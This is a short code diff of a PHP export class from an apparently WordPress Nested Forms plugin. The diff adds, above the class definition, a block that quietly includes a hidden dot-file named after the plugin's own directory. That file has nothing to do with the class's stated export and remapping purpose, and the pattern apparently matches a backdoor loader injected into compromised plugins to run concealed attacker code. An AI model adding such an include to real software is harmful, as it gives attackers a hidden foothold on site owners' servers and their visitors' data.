@@ -6,6 +6,10 @@
  * Primary purpose: Handle exporting child entries alongside their corresponding parent entry.
  * Secondary purpose: Handle remapping child forms on Nested Form fields when exporting/importing a parent form.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GPNF_Export {
 
 	private static $instance = null;
